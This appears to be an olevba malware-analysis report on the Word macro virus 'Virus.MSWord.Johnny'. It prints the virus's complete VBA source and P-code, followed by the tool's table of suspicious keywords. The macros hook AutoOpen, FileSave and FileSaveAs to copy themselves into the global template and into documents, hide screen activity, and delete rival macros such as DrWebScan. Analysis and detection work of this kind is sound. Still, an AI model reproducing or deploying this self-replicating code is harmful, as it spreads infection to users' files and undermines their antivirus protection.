olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Johnny
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Johnny - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vGojohnny.bas 
in file: Virus.MSWord.Johnny - OLE stream: 'Macros/VBA/vGojohnny'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'Our devise - A copy of "Go Johnny Go" on every computer !

'                                       M.H., E.R.
End Sub
-------------------------------------------------------------------------------
VBA MACRO Presentz.bas 
in file: Virus.MSWord.Johnny - OLE stream: 'Macros/VBA/Presentz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN() 'fs
Dim d$
Dim MH
Dim i
Dim A$
Dim lnh1
Dim dlg As Object
Dim iMC
Dim BI
On Error GoTo -1: On Error GoTo aend
WordBasic.ScreenUpdating (0)
WordBasic.DisableInput 1
d$ = WordBasic.[FileName$]()
MH = Len(d$)
For i = 0 To MH
A$ = WordBasic.[Right$](d$, i)
A$ = WordBasic.[Left$](WordBasic.[LTrim$](A$), 1)
If A$ = "\" Then GoTo cnt
Next i
cnt:
lnh1 = i - 1
If MH - lnh1 = 0 Then
On Error GoTo -1: On Error GoTo ecss
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.PrintStatusBar "For Help, press F1"
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
MC
WordBasic.MacroCopy "Global:Presentz", WordBasic.[FileName$]() + ":FileSave"
WordBasic.FileSaveAs dlg
GoTo aend
Else
If WordBasic.[Right$](d$, 3) = "DOC" Then
MC
WordBasic.FileSaveAs Format:=1
Else
WordBasic.FileSave
End If
End If
ecss:
If Err.Number = 102 Then GoTo aend
aend:
On Error GoTo -1: On Error GoTo aen
iMC = WordBasic.CountMacros(0, 0)
For i = 1 To iMC
If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
BI = 1
End If
If WordBasic.[MacroName$](i, 0, 0) = "DrWebScan" Then
WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="DrWebScan", Tab:=3
End If
If WordBasic.[MacroName$](i, 0, 0) = "FileOpen" Then
WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="FileOpen", Tab:=3
End If
Next i
If BI = 0 Then
WordBasic.MacroCopy d$ + ":Presentw", "Global:FileSaveAs"
End If
aen:
End Sub
Private Sub MC()
Dim ds$
ds$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:Presentv", ds$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Presentv", ds$ + ":Presentv"
WordBasic.MacroCopy "Global:Presentw", ds$ + ":Presentw"
WordBasic.MacroCopy "Global:Presentz", ds$ + ":Presentz"
WordBasic.MacroCopy "Global:vGojohnny", ds$ + ":vGojohnny"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Presentw.bas 
in file: Virus.MSWord.Johnny - OLE stream: 'Macros/VBA/Presentw'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN() 'fsAs
Dim d$
Dim Dl
Dim i
Dim A$
Dim lnh1
Dim dlg As Object
Dim NO$
Dim O_D_P$
Dim TMP$
Dim stt$
Dim tm$
Dim tm2$
Dim FileN$
Dim NDPh$
On Error GoTo -1: On Error GoTo aend
WordBasic.ScreenUpdating (0)
WordBasic.DisableInput 1
d$ = WordBasic.[FileName$]()
Dl = Len(d$)
For i = 0 To Dl
A$ = WordBasic.[Right$](d$, i)
A$ = WordBasic.[Left$](WordBasic.[LTrim$](A$), 1)
If A$ = "\" Then GoTo cnt
Next i
cnt:
lnh1 = i - 1
If Dl - lnh1 = 0 Then
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
MC
WordBasic.FileSaveAs dlg
GoTo aend
End If
NO$ = LCase(WordBasic.[Right$](d$, lnh1))
O_D_P$ = WordBasic.[DefaultDir$](14)
TMP$ = WordBasic.[DefaultDir$](13)
stt$ = TMP$ + "\doc2.doc"
tm$ = TMP$ + "\" + NO$
tm2$ = TMP$ + "\~wrf7mhr.tmp"
If WordBasic.[Files$](tm2$) = "" Then
WordBasic.FileNewDefault
WordBasic.Insert "NAIPESVOH REHM"
WordBasic.PrintStatusBar "Starting Autosave"
WordBasic.FileSaveAs Name:=TMP$ + "\doc2.doc", Format:=0
WordBasic.FileClose
WordBasic.Rename TMP$ + "\doc2.doc", tm2$
End If
WordBasic.CopyFile FileName:=tm2$, Directory:=tm$
WordBasic.FileOpen tm$
WordBasic.PrintStatusBar "For Help, press F1"
On Error GoTo -1: On Error GoTo ife
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
dlg.Name = NO$
WordBasic.Dialog.FileSaveAs dlg
FileN$ = dlg.Name
NDPh$ = WordBasic.[DefaultDir$](14)
If Len(NDPh$) > 3 Then NDPh$ = NDPh$ + "\"
If dlg.Format > 1 Then
WordBasic.FileClose 2
WordBasic.Kill tm$
WordBasic.FileSaveAs Name:=stt$, Format:=1
WordBasic.FileClose 2
WordBasic.FileNew Template:=stt$
WordBasic.FileSaveAs dlg
GoTo aend
End If
ife:
If Err.Number = 102 Then
WordBasic.FileClose 2
WordBasic.Kill tm$
GoTo aend
End If
d?ltmp:
WordBasic.FileClose 2
WordBasic.Kill tm$
MC
WordBasic.FileSaveAs Name:=NDPh$ + FileN$, Format:=1
aend:
End Sub
Private Sub MC()
Dim ds$
ds$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:Presentv", ds$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Presentv", ds$ + ":Presentv"
WordBasic.MacroCopy "Global:Presentw", ds$ + ":Presentw"
WordBasic.MacroCopy "Global:Presentz", ds$ + ":Presentz"
WordBasic.MacroCopy "Global:Presentz", ds$ + ":FileSave"
WordBasic.MacroCopy "Global:vGojohnny", ds$ + ":vGojohnny"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Johnny
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/vGojohnny - 1054 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	QuoteRem 0x0000 0x0039 "Our devise - A copy of "Go Johnny Go" on every computer !"
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x0031 "                                       M.H., E.R."
' Line #5:
' 	EndSub 
' Macros/VBA/Presentz - 4293 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' 	QuoteRem 0x000F 0x0002 "fs"
' Line #2:
' 	Dim 
' 	VarDefn d
' Line #3:
' 	Dim 
' 	VarDefn MH
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn A
' Line #6:
' 	Dim 
' 	VarDefn lnh1
' Line #7:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #8:
' 	Dim 
' 	VarDefn iMC
' Line #9:
' 	Dim 
' 	VarDefn BI
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError aend 
' Line #11:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St d$ 
' Line #14:
' 	Ld d$ 
' 	FnLen 
' 	St MH 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld MH 
' 	For 
' Line #16:
' 	Ld d$ 
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	St A$ 
' Line #17:
' 	Ld A$ 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St A$ 
' Line #18:
' 	Ld A$ 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cnt 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Label cnt 
' Line #21:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St lnh1 
' Line #22:
' 	Ld MH 
' 	Ld lnh1 
' 	Sub 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ecss 
' Line #24:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' 	LitStr 0x0012 "For Help, press F1"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #29:
' 	ArgsCall MC 0x0000 
' Line #30:
' 	LitStr 0x000F "Global:Presentz"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #32:
' 	GoTo aend 
' Line #33:
' 	ElseBlock 
' Line #34:
' 	Ld d$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	ArgsCall MC 0x0000 
' Line #36:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Label ecss 
' Line #42:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo aend 
' 	EndIf 
' Line #43:
' 	Label aend 
' Line #44:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError aen 
' Line #45:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMC 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMC 
' 	For 
' Line #47:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	IfBlock 
' Line #48:
' 	LitDI2 0x0001 
' 	St BI 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "DrWebScan"
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0009 "DrWebScan"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0008 "FileOpen"
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0008 "FileOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld BI 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld d$ 
' 	LitStr 0x0009 ":Presentw"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Label aen 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Private Sub MC())
' Line #63:
' 	Dim 
' 	VarDefn ds
' Line #64:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St ds$ 
' Line #65:
' 	LitStr 0x000F "Global:Presentv"
' 	Ld ds$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #66:
' 	LitStr 0x000F "Global:Presentv"
' 	Ld ds$ 
' 	LitStr 0x0009 ":Presentv"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #67:
' 	LitStr 0x000F "Global:Presentw"
' 	Ld ds$ 
' 	LitStr 0x0009 ":Presentw"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #68:
' 	LitStr 0x000F "Global:Presentz"
' 	Ld ds$ 
' 	LitStr 0x0009 ":Presentz"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #69:
' 	LitStr 0x0010 "Global:vGojohnny"
' 	Ld ds$ 
' 	LitStr 0x000A ":vGojohnny"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #70:
' 	EndSub 
' Macros/VBA/Presentw - 5258 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' 	QuoteRem 0x000F 0x0004 "fsAs"
' Line #2:
' 	Dim 
' 	VarDefn d
' Line #3:
' 	Dim 
' 	VarDefn Dl
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn A
' Line #6:
' 	Dim 
' 	VarDefn lnh1
' Line #7:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #8:
' 	Dim 
' 	VarDefn NO
' Line #9:
' 	Dim 
' 	VarDefn O_D_P
' Line #10:
' 	Dim 
' 	VarDefn TMP
' Line #11:
' 	Dim 
' 	VarDefn stt
' Line #12:
' 	Dim 
' 	VarDefn tm
' Line #13:
' 	Dim 
' 	VarDefn tm2
' Line #14:
' 	Dim 
' 	VarDefn FileN
' Line #15:
' 	Dim 
' 	VarDefn NDPh
' Line #16:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError aend 
' Line #17:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St d$ 
' Line #20:
' 	Ld d$ 
' 	FnLen 
' 	St Dl 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Dl 
' 	For 
' Line #22:
' 	Ld d$ 
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	St A$ 
' Line #23:
' 	Ld A$ 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St A$ 
' Line #24:
' 	Ld A$ 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cnt 
' 	EndIf 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	Label cnt 
' Line #27:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St lnh1 
' Line #28:
' 	Ld Dl 
' 	Ld lnh1 
' 	Sub 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #30:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #31:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #32:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #33:
' 	ArgsCall MC 0x0000 
' Line #34:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #35:
' 	GoTo aend 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld d$ 
' 	Ld lnh1 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St NO$ 
' Line #38:
' 	LitDI2 0x000E 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St O_D_P$ 
' Line #39:
' 	LitDI2 0x000D 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St TMP$ 
' Line #40:
' 	Ld TMP$ 
' 	LitStr 0x0009 "\doc2.doc"
' 	Add 
' 	St stt$ 
' Line #41:
' 	Ld TMP$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NO$ 
' 	Add 
' 	St tm$ 
' Line #42:
' 	Ld TMP$ 
' 	LitStr 0x000D "\~wrf7mhr.tmp"
' 	Add 
' 	St tm2$ 
' Line #43:
' 	Ld tm2$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #45:
' 	LitStr 0x000E "NAIPESVOH REHM"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #46:
' 	LitStr 0x0011 "Starting Autosave"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #47:
' 	Ld TMP$ 
' 	LitStr 0x0009 "\doc2.doc"
' 	Add 
' 	ParamNamed New 
' 	LitDI2 0x0000 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #48:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #49:
' 	Ld TMP$ 
' 	LitStr 0x0009 "\doc2.doc"
' 	Add 
' 	Ld tm2$ 
' 	Ld WordBasic 
' 	ArgsMemCall Rename 0x0002 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld tm2$ 
' 	ParamNamed FileName 
' 	Ld tm$ 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #52:
' 	Ld tm$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #53:
' 	LitStr 0x0012 "For Help, press F1"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #54:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ife 
' Line #55:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #56:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #57:
' 	Ld NO$ 
' 	Ld dlg 
' 	MemSt New 
' Line #58:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #59:
' 	Ld dlg 
' 	MemLd New 
' 	St FileN$ 
' Line #60:
' 	LitDI2 0x000E 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St NDPh$ 
' Line #61:
' 	Ld NDPh$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld NDPh$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St NDPh$ 
' 	EndIf 
' Line #62:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #63:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #64:
' 	Ld tm$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #65:
' 	Ld stt$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #66:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #67:
' 	Ld stt$ 
' 	ParamNamed Template 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0001 
' Line #68:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #69:
' 	GoTo aend 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Label ife 
' Line #72:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Eq 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #74:
' 	Ld tm$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #75:
' 	GoTo aend 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Reparse 0x0007 "d?ltmp:"
' Line #78:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #79:
' 	Ld tm$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #80:
' 	ArgsCall MC 0x0000 
' Line #81:
' 	Ld NDPh$ 
' 	Ld FileN$ 
' 	Add 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #82:
' 	Label aend 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Private Sub MC())
' Line #85:
' 	Dim 
' 	VarDefn ds
' Line #86:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St ds$ 
' Line #87:
' 	LitStr 0x000F "Global:Presentv"
' 	Ld ds$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #88:
' 	LitStr 0x000F "Global:Presentv"
' 	Ld ds$ 
' 	LitStr 0x0009 ":Presentv"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #89:
' 	LitStr 0x000F "Global:Presentw"
' 	Ld ds$ 
' 	LitStr 0x0009 ":Presentw"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #90:
' 	LitStr 0x000F "Global:Presentz"
' 	Ld ds$ 
' 	LitStr 0x0009 ":Presentz"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #91:
' 	LitStr 0x000F "Global:Presentz"
' 	Ld ds$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #92:
' 	LitStr 0x0010 "Global:vGojohnny"
' 	Ld ds$ 
' 	LitStr 0x000A ":vGojohnny"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #93:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

